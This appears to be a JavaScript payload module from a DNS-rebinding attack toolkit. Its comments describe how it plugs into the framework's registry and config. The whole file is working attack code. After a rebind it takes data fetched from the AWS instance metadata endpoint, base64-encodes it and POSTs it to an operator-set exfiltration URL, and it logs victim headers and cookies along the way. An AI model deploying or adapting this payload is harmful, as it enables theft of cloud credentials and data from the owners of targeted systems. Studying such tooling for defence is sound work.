/**
 * AWS Metadata Exfil payload.
 *
 * Invoked by payload.js after a successful DNS rebind. The body argument is
 * whatever payload.js fetched from CONFIG.targetPath in amaze.html (e.g.
 * /latest/meta-data). This payload base64-encodes that body and POSTs it to
 * EXFILTRATION_URL — useful when the victim is a headless browser and you
 * can't see its console.
 *
 * All settings live in amaze.html: exfiltrationURL and targetPath.
 * No operator edits to this payload file are needed.
 *
 * Stripped from upstream:
 *   - isService() — never invoked by payload.js after the manager dashboard
 *     was removed. The Registry-based dispatch picks the payload by name from
 *     CONFIG.attackPayload, not by service detection.
 *   - The AbortController/timeout dance that only existed for isService.
 */

const AwsMetadataExfil = () => ({
    attack(headers, cookie, body) {
        if (headers) console.log(`[exfil] headers:${httpHeaderstoText(headers)}`);
        if (cookie)  console.log(`[exfil] cookie: ${cookie}`);
        if (body)    console.log(`[exfil] body:\n${body}`);

        // Explicit operator-selected collector, configured in amaze.html.
        const EXFILTRATION_URL = horizonConfig.exfiltrationURL || "";
        if (!EXFILTRATION_URL) { console.log("[exfil] No collector configured; response remains in console."); return; }

        // UTF-8 → base64 via TextEncoder (replaces deprecated unescape() trick)
        const utf8 = new TextEncoder().encode(body || '');
        let binary = '';
        for (let i = 0; i < utf8.length; i += 0x8000) binary += String.fromCharCode(...utf8.subarray(i, i + 0x8000));
        const base64Body = btoa(binary);

        sooFetch(EXFILTRATION_URL, {
            method: 'POST',
            mode:   'no-cors',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
            body:   base64Body,
        });
    },

    // Stub so the Go template's `attackPayload: 'automatic'` mode doesn't crash
    // when iterating Registry. Returns false → this payload opts out of auto-detection.
    isService: async () => false,
});

// Registry key MUST match CONFIG.attackPayload in amaze.html
Registry["AWS Metadata Exfil"] = AwsMetadataExfil();
